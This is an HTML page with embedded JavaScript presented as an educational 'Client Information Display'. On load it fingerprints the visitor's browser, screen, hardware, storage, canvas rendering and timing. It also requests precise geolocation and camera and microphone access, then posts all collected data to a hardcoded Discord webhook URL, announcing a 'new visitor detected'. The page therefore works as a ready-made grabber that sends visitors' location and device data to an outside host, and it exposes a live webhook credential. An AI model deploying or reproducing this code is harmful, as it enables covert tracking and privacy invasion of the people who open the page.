<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Information Display</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        h1 {
            color: #333;
            text-align: center;
            border-bottom: 2px solid #ddd;
            padding-bottom: 10px;
        }
        .info-section {
            background-color: white;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h2 {
            color: #444;
            margin-top: 0;
        }
        .info-item {
            margin-bottom: 10px;
        }
        .label {
            font-weight: bold;
            display: inline-block;
            width: 180px;
        }
        .value {
            display: inline-block;
        }
        .disclaimer {
            background-color: #fffacc;
            padding: 10px;
            border-radius: 5px;
            font-size: 0.9em;
            margin-top: 20px;
        }
        .loading {
            padding: 10px;
            color: #666;
            font-style: italic;
        }
        .status {
            background-color: #e6f7e6;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            text-align: center;
        }
        .error {
            background-color: #ffebee;
            color: #c62828;
        }
    </style>
</head>
<body>
    <h1>Client Information Display</h1>
    <div class="disclaimer">
        <strong>Note:</strong> This page automatically collects available information about your browser and device.
        This is for educational purposes only and helps illustrate privacy concepts and web security awareness.
        <strong>Data will be sent to a Discord webhook for analysis.</strong>
    </div>
    
    <div class="status" id="webhook-status">
        <span>Collecting information...</span>
    </div>
    
    <div class="info-section">
        <h2>Browser & Device Information</h2>
        <div id="browser-info"></div>
    </div>
    
    <div class="info-section">
        <h2>Screen & Window Information</h2>
        <div id="screen-info"></div>
    </div>
    
    <div class="info-section">
        <h2>Network Information</h2>
        <div id="network-info"></div>
    </div>
    
    <div class="info-section">
        <h2>Location Information</h2>
        <div id="geo-info">
            <div class="loading">Attempting to get location data...</div>
        </div>
    </div>
    
    <div class="info-section">
        <h2>Battery Information</h2>
        <div id="battery-info">
            <div class="loading">Fetching battery information...</div>
        </div>
    </div>
    
    <div class="info-section">
        <h2>Hardware Information</h2>
        <div id="hardware-info"></div>
    </div>
    
    <div class="info-section">
        <h2>Browser Capabilities</h2>
        <div id="capabilities-info"></div>
    </div>
    
    <div class="info-section">
        <h2>Time & Timezone Information</h2>
        <div id="time-info"></div>
    </div>
    
    <div class="info-section">
        <h2>Media Devices</h2>
        <div id="media-info">
            <div class="loading">Requesting media device information...</div>
        </div>
    </div>
    
    <div class="info-section">
        <h2>Local Storage Analysis</h2>
        <div id="storage-info"></div>
    </div>
    
    <div class="info-section">
        <h2>HTTP Request Headers</h2>
        <div id="headers-info">
            <p>Note: Complete headers are only visible server-side, but common headers are estimated below.</p>
        </div>
    </div>
    
    <div class="info-section">
        <h2>Canvas Fingerprinting Sample</h2>
        <div id="fingerprint-info">
            <p>This demonstrates one technique used for browser fingerprinting:</p>
            <canvas id="fingerprintCanvas" width="220" height="30"></canvas>
            <div id="canvas-hash"></div>
        </div>
    </div>
    
    <div class="info-section">
        <h2>Performance Information</h2>
        <div id="performance-info"></div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1331766891630563360/hNFGqedGjuvsgNJmGBrk0asdX_kZ0D7dlK-7MdXEHihk_oXwYDrGtdNNRGO4UA4ZmBf7";
        
        const allCollectedData = {};
        
        function addInfoItem(containerId, label, value) {
            const container = document.getElementById(containerId);
            const item = document.createElement('div');
            item.className = 'info-item';
            
            const labelSpan = document.createElement('span');
            labelSpan.className = 'label';
            labelSpan.textContent = label + ': ';
            
            const valueSpan = document.createElement('span');
            valueSpan.className = 'value';
            valueSpan.textContent = value;
            
            item.appendChild(labelSpan);
            item.appendChild(valueSpan);
            container.appendChild(item);
            
            if (!allCollectedData[containerId]) {
                allCollectedData[containerId] = {};
            }
            allCollectedData[containerId][label] = value;
        }
        
        function clearLoading(containerId) {
            const container = document.getElementById(containerId);
            const loadingElements = container.querySelectorAll('.loading');
            loadingElements.forEach(el => el.remove());
        }
        
        function sendToDiscordWebhook() {
            const statusElement = document.getElementById('webhook-status');
            
            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL") {
                statusElement.textContent = "Discord webhook not configured. Please set your webhook URL in the code.";
                statusElement.classList.add('error');
                return;
            }
            
            const embeds = [];
            
            const mainEmbed = {
                title: "Client Information Collected",
                description: "New visitor detected on your site",
                color: 7506394,
                timestamp: new Date().toISOString(),
                footer: {
                    text: "Client Info Collector"
                },
                fields: []
            };
            
            mainEmbed.fields.push({
                name: "Timestamp",
                value: new Date().toString()
            });
            
            if (allCollectedData['browser-info'] && allCollectedData['browser-info']['User Agent']) {
                mainEmbed.fields.push({
                    name: "User Agent",
                    value: allCollectedData['browser-info']['User Agent']
                });
            }
            
            embeds.push(mainEmbed);
            
            if (allCollectedData['browser-info']) {
                const browserEmbed = {
                    title: "Browser Information",
                    color: 3447003,
                    fields: []
                };
                
                Object.entries(allCollectedData['browser-info']).forEach(([key, value]) => {
                    browserEmbed.fields.push({
                        name: key,
                        value: value.toString(),
                        inline: true
                    });
                });
                
                embeds.push(browserEmbed);
            }
            
            if (allCollectedData['screen-info']) {
                const screenEmbed = {
                    title: "Screen & Window Information",
                    color: 10181046,
                    fields: []
                };
                
                Object.entries(allCollectedData['screen-info']).forEach(([key, value]) => {
                    screenEmbed.fields.push({
                        name: key,
                        value: value.toString(),
                        inline: true
                    });
                });
                
                embeds.push(screenEmbed);
            }
            
            if (allCollectedData['geo-info'] && allCollectedData['geo-info']['Latitude']) {
                const locationEmbed = {
                    title: "Location Information",
                    color: 15105570,
                    fields: []
                };
                
                Object.entries(allCollectedData['geo-info']).forEach(([key, value]) => {
                    locationEmbed.fields.push({
                        name: key,
                        value: value.toString(),
                        inline: true
                    });
                });
                
                embeds.push(locationEmbed);
            }
            
            if (allCollectedData['network-info']) {
                const networkEmbed = {
                    title: "Network Information",
                    color: 2067276,
                    fields: []
                };
                
                Object.entries(allCollectedData['network-info']).forEach(([key, value]) => {
                    networkEmbed.fields.push({
                        name: key,
                        value: value.toString(),
                        inline: true
                    });
                });
                
                embeds.push(networkEmbed);
            }
            
            const payload = {
                username: "Client Info Collector",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/1946/1946429.png",
                content: "New visitor detected!",
                embeds: embeds
            };
            
            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    statusElement.textContent = "Information successfully sent!";
                    statusElement.style.backgroundColor = "#e6f7e6";
                } else {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
            })
            .catch(error => {
                console.error('Error sending to Discord:', error);
                statusElement.textContent = "Error sending information: " + error.message;
                statusElement.classList.add('error');
            });
            
            const additionalData = {
                title: "Additional Information",
                description: "Hardware, capabilities, and other details",
                color: 15158332,
                fields: []
            };
            
            ['hardware-info', 'capabilities-info', 'time-info', 'battery-info', 'media-info', 'storage-info', 'performance-info'].forEach(section => {
                if (allCollectedData[section]) {
                    Object.entries(allCollectedData[section]).forEach(([key, value]) => {
                        additionalData.fields.push({
                            name: `${section.split('-')[0].toUpperCase()} | ${key}`,
                            value: value.toString(),
                            inline: true
                        });
                    });
                }
            });
            
            if (additionalData.fields.length > 0) {
                const chunkedFields = [];
                for (let i = 0; i < additionalData.fields.length; i += 25) {
                    chunkedFields.push(additionalData.fields.slice(i, i + 25));
                }
                
                chunkedFields.forEach((fieldChunk, index) => {
                    const chunkPayload = {
                        username: "Client Info Collector",
                        embeds: [{
                            title: `Additional Information (Part ${index + 1})`,
                            color: 15158332,
                            fields: fieldChunk
                        }]
                    };
                    
                    setTimeout(() => {
                        fetch(DISCORD_WEBHOOK_URL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(chunkPayload)
                        }).catch(error => console.error('Error sending additional data:', error));
                    }, index * 1000);
                });
            }
        }
        
        let dataCollectionComplete = {
            basic: false,
            geo: false,
            battery: false,
            media: false
        };
        
        function checkDataCollectionStatus() {
            if (Object.values(dataCollectionComplete).every(status => status === true)) {
                sendToDiscordWebhook();
            }
        }
        
        const browserInfo = {
            'User Agent': navigator.userAgent,
            'Browser Language': navigator.language,
            'Languages': Array.isArray(navigator.languages) ? navigator.languages.join(', ') : navigator.language,
            'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
            'Do Not Track': navigator.doNotTrack || 'Not specified',
            'Platform': navigator.platform,
            'Browser Vendor': navigator.vendor || 'Not available',
            'Browser Version': navigator.appVersion || 'Not available',
            'App Name': navigator.appName || 'Not available',
            'Product': navigator.product || 'Not available'
        };
        
        Object.entries(browserInfo).forEach(([label, value]) => {
            addInfoItem('browser-info', label, value);
        });
        
        const screenInfo = {
            'Screen Width': window.screen.width + 'px',
            'Screen Height': window.screen.height + 'px',
            'Available Width': window.screen.availWidth + 'px',
            'Available Height': window.screen.availHeight + 'px',
            'Color Depth': window.screen.colorDepth + ' bits',
            'Pixel Depth': window.screen.pixelDepth + ' bits',
            'Window Inner Width': window.innerWidth + 'px',
            'Window Inner Height': window.innerHeight + 'px',
            'Device Pixel Ratio': window.devicePixelRatio,
            'Orientation': screen.orientation ? screen.orientation.type : 'Not available'
        };
        
        Object.entries(screenInfo).forEach(([label, value]) => {
            addInfoItem('screen-info', label, value);
        });
        
        if ('connection' in navigator) {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                const networkInfo = {
                    'Effective Type': connection.effectiveType || 'Not available',
                    'Downlink': (connection.downlink ? connection.downlink + ' Mbps' : 'Not available'),
                    'Round Trip Time': (connection.rtt ? connection.rtt + ' ms' : 'Not available'),
                    'Save Data Mode': connection.saveData ? 'Enabled' : 'Disabled'
                };
                
                Object.entries(networkInfo).forEach(([label, value]) => {
                    addInfoItem('network-info', label, value);
                });
            }
        } else {
            addInfoItem('network-info', 'Network Information', 'API not available in this browser');
        }
        
        const hardwareInfo = {
            'Logical CPU Cores': navigator.hardwareConcurrency || 'Not available',
            'Maximum Touch Points': navigator.maxTouchPoints || 'Not available',
            'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Not available'
        };
        
        Object.entries(hardwareInfo).forEach(([label, value]) => {
            addInfoItem('hardware-info', label, value);
        });
        
        const caps = {
            'PDF Viewer Built-in': navigator.pdfViewerEnabled ? 'Yes' : 'No/Unknown',
            'Java Enabled': navigator.javaEnabled ? navigator.javaEnabled() : 'Unknown',
            'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
            'Local Storage Available': typeof(Storage) !== 'undefined' ? 'Yes' : 'No',
            'Session Storage Available': typeof(sessionStorage) !== 'undefined' ? 'Yes' : 'No',
            'IndexedDB Available': window.indexedDB ? 'Yes' : 'No',
            'WEBGL Available': (function() {
                try {
                    return !!window.WebGLRenderingContext && 
                           !!document.createElement('canvas').getContext('experimental-webgl');
                } catch(e) {
                    return false;
                }
            })() ? 'Yes' : 'No',
            'Web Workers Available': !!window.Worker ? 'Yes' : 'No',
            'Service Workers Available': 'serviceWorker' in navigator ? 'Yes' : 'No',
            'Push Notifications Available': 'PushManager' in window ? 'Yes' : 'No'
        };
        
        Object.entries(caps).forEach(([label, value]) => {
            addInfoItem('capabilities-info', label, value);
        });
        
        const now = new Date();
        const timeInfo = {
            'Current Time': now.toString(),
            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
            'Timezone Offset': now.getTimezoneOffset() + ' minutes from UTC',
            'Date Locale': Intl.DateTimeFormat().resolvedOptions().locale
        };
        
        Object.entries(timeInfo).forEach(([label, value]) => {
            addInfoItem('time-info', label, value);
        });
        
        try {
            if (window.localStorage) {
                const storageInfo = {
                    'LocalStorage Available': 'Yes',
                    'LocalStorage Items': localStorage.length,
                    'SessionStorage Available': window.sessionStorage ? 'Yes' : 'No',
                    'SessionStorage Items': window.sessionStorage ? sessionStorage.length : 'N/A',
                    'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
                    'Cookie Count': document.cookie ? document.cookie.split(';').length : 0
                };
                
                Object.entries(storageInfo).forEach(([label, value]) => {
                    addInfoItem('storage-info', label, value);
                });
            } else {
                addInfoItem('storage-info', 'Local Storage', 'Not available');
            }
        } catch (e) {
            addInfoItem('storage-info', 'Error accessing storage', e.message);
        }
        
        const commonHeaders = {
            'User-Agent': navigator.userAgent,
            'Accept-Language': navigator.language,
            'DNT (Do Not Track)': navigator.doNotTrack || 'Not specified',
            'Referer': document.referrer || 'None/Direct Navigation',
            'Host': window.location.host,
            'Origin': window.location.origin
        };
        
        Object.entries(commonHeaders).forEach(([label, value]) => {
            addInfoItem('headers-info', label, value);
        });
        
        try {
            const canvas = document.getElementById('fingerprintCanvas');
            const ctx = canvas.getContext('2d');
            
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Fingerprint", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Test", 4, 17);
            
            const dataURL = canvas.toDataURL();
            const hash = dataURL.length;
            
            addInfoItem('canvas-hash', 'Canvas Fingerprint Value', 'Signature Length: ' + hash);
            
            if (!allCollectedData['fingerprint-info']) {
                allCollectedData['fingerprint-info'] = {};
            }
            allCollectedData['fingerprint-info']['Canvas Fingerprint'] = hash;
            allCollectedData['fingerprint-info']['Canvas Data URL'] = dataURL.substring(0, 100) + '...';
        } catch (e) {
            addInfoItem('canvas-hash', 'Canvas Fingerprinting', 'Failed: ' + e.message);
        }
        
        if (window.performance) {
            const perfInfo = {
                'Navigation Type': (function() {
                    const navType = performance.navigation ? performance.navigation.type : null;
                    if (navType === 0) return 'Navigate';
                    if (navType === 1) return 'Reload';
                    if (navType === 2) return 'Back/Forward';
                    return 'Unknown';
                })(),
                'Redirect Count': performance.navigation ? performance.navigation.redirectCount : 'Unknown',
                'Page Load Time': performance.timing ? 
                    (performance.timing.loadEventEnd - performance.timing.navigationStart) + ' ms' : 
                    'Not available'
            };
            
            Object.entries(perfInfo).forEach(([label, value]) => {
                addInfoItem('performance-info', label, value);
            });
            
            if (performance.getEntriesByType) {
                try {
                    const navEntry = performance.getEntriesByType('navigation')[0];
                    if (navEntry) {
                        addInfoItem('performance-info', 'DOM Complete Time', navEntry.domComplete + ' ms');
                        addInfoItem('performance-info', 'DOM Interactive Time', navEntry.domInteractive + ' ms');
                        addInfoItem('performance-info', 'Response Start Time', navEntry.responseStart + ' ms');
                    }
                } catch (e) {
                }
                
                try {
                    const paintEntries = performance.getEntriesByType('paint');
                    if (paintEntries.length > 0) {
                        paintEntries.forEach(entry => {
                            addInfoItem('performance-info', entry.name, entry.startTime + ' ms');
                        });
                    }
                } catch (e) {
                }
            }
        } else {
            addInfoItem('performance-info', 'Performance API', 'Not available');
        }
        
        dataCollectionComplete.basic = true;
        
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    clearLoading('geo-info');
                    addInfoItem('geo-info', 'Latitude', position.coords.latitude);
                    addInfoItem('geo-info', 'Longitude', position.coords.longitude);
                    addInfoItem('geo-info', 'Accuracy', position.coords.accuracy + ' meters');
                    if (position.coords.altitude) {
                        addInfoItem('geo-info', 'Altitude', position.coords.altitude + ' meters');
                    }
                    if (position.coords.heading) {
                        addInfoItem('geo-info', 'Heading', position.coords.heading + '°');
                    }
                    if (position.coords.speed) {
                        addInfoItem('geo-info', 'Speed', position.coords.speed + ' m/s');
                    }
                    addInfoItem('geo-info', 'Timestamp', new Date(position.timestamp).toString());
                    
                    dataCollectionComplete.geo = true;
                    checkDataCollectionStatus();
                },
                function(error) {
                    clearLoading('geo-info');
                    addInfoItem('geo-info', 'Geolocation API', 'Available but permission denied or error');
                    addInfoItem('geo-info', 'Error', error.message);
                    
                    dataCollectionComplete.geo = true;
                    checkDataCollectionStatus();
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            clearLoading('geo-info');
            addInfoItem('geo-info', 'Geolocation API', 'Not available in this browser');
            
            dataCollectionComplete.geo = true;
            checkDataCollectionStatus();
        }
        
        if ('getBattery' in navigator) {
            navigator.getBattery().then(function(battery) {
                clearLoading('battery-info');
                addInfoItem('battery-info', 'Battery Charging', battery.charging ? 'Yes' : 'No');
                addInfoItem('battery-info', 'Battery Level', (battery.level * 100) + '%');
                addInfoItem('battery-info', 'Charging Time', battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds');
                addInfoItem('battery-info', 'Discharging Time', battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds');
                
                battery.addEventListener('chargingchange', function() {
                    document.querySelector('#battery-info .info-item:nth-child(1) .value').textContent = battery.charging ? 'Yes' : 'No';
                });
                battery.addEventListener('levelchange', function() {
                    document.querySelector('#battery-info .info-item:nth-child(2) .value').textContent = (battery.level * 100) + '%';
                });
                
                dataCollectionComplete.battery = true;
                checkDataCollectionStatus();
            }).catch(function(error) {
                clearLoading('battery-info');
                addInfoItem('battery-info', 'Battery API', 'Error accessing battery: ' + error.message);
                
                dataCollectionComplete.battery = true;
                checkDataCollectionStatus();
            });
        } else {
            clearLoading('battery-info');
            addInfoItem('battery-info', 'Battery API', 'Not available in this browser');
            
            dataCollectionComplete.battery = true;
            checkDataCollectionStatus();
        }
        
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
            .then(function(stream) {
                stream.getTracks().forEach(track => track.stop());
                
                navigator.mediaDevices.enumerateDevices()
                .then(function(devices) {
                    clearLoading('media-info');
                    let audioInputCount = 0;
                    let audioOutputCount = 0;
                    let videoInputCount = 0;
                    
                    devices.forEach(function(device) {
                        if (device.kind === 'audioinput') audioInputCount++;
                        if (device.kind === 'audiooutput') audioOutputCount++;
                        if (device.kind === 'videoinput') videoInputCount++;
                    });
                    
                    addInfoItem('media-info', 'Microphones', audioInputCount);
                    addInfoItem('media-info', 'Speakers/Headphones', audioOutputCount);
                    addInfoItem('media-info', 'Cameras', videoInputCount);
                    
                    dataCollectionComplete.media = true;
                    checkDataCollectionStatus();
                });
            })
            .catch(function(err) {
                navigator.mediaDevices.enumerateDevices()
                .then(function(devices) {
                    clearLoading('media-info');
                    addInfoItem('media-info', 'Permission Status', 'Denied: ' + err.message);
                    addInfoItem('media-info', 'Device Count', devices.length + ' (limited information due to permissions)');
                    
                    dataCollectionComplete.media = true;
                    checkDataCollectionStatus();
                })
                .catch(function(enumErr) {
                    clearLoading('media-info');
                    addInfoItem('media-info', 'Media Devices API', 'Error: ' + enumErr.message);
                    
                    dataCollectionComplete.media = true;
                    checkDataCollectionStatus();
                });
            });
        } else {
            clearLoading('media-info');
            addInfoItem('media-info', 'Media Devices API', 'Not available in this browser');
            
            dataCollectionComplete.media = true;
            checkDataCollectionStatus();
        }
    </script>
</body>
</html>
